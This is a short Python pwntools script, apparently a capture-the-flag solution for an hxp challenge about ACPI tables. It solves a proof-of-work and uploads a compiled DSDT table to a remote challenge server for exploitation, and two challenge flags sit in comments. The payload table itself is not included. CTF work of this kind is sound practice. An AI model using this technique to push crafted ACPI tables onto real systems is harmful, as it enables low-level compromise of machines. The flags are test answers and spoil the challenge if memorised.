#!/usr/bin/env python
# coding: utf-8

from pwn import *
import base64

# hxp{pl3453_4ud17_y0ur_ACPI_74bl35_b3f0r3_7h1nk16_0f_7h3_3nv1r0nm3n7}
# hxp{acpi_ACPI_we_hope_that_you_finally_used_these_tables_to_pwn!}

p = remote('195.201.134.82', 13376)

p.recvuntil('unhex("')
prefix = p.recvuntil('"', drop=True)

solve = process(('./pow-solver', '27', prefix))
sol = solve.recvuntil('\n', drop=True)

p.sendline(sol)
time.sleep(1)
# iasl dsdt.dsl
p.sendline(base64.encodestring(open('dsdt.aml', 'rb').read()).replace('\n', ''))

p.interactive()
